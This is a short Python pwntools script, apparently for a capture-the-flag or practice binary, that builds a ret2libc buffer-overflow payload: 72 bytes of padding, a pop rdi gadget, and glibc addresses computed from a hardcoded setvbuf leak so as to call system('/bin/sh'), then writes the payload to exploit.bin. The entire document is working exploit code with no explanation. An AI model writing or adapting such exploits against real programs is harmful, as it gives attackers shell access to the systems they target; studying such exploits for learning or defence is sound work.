#!/usr/bin/python
from pwn import *

offset = 72
junk = b'A' * offset

pop_rdi_ret         = 0x4012cb
pop_rsi_pop_r15_ret = 0x4012c9
write_plt = 0x401030
main_addr = 0x401230

setvbuf_offset = 0x813d0   # 0x84ce0
system_offset  = 0x4f550   # 0x52290
bin_sh_offset  = 0x1b3e1a  # 0x1b45bd
setvbuf_addr = 0x7ffff7e210e0

glibc_base_addr = setvbuf_addr - setvbuf_offset
system_addr = glibc_base_addr + system_offset
bin_sh_addr = glibc_base_addr + bin_sh_offset


payload  = junk
payload += p64(pop_rdi_ret)
payload += p64(bin_sh_addr)
payload += p64(system_addr)

menu_option = b"1"

print(menu_option)
print(payload)


f = open("exploit.bin", "wb")
f.write(menu_option)
f.write(payload)
f.close()
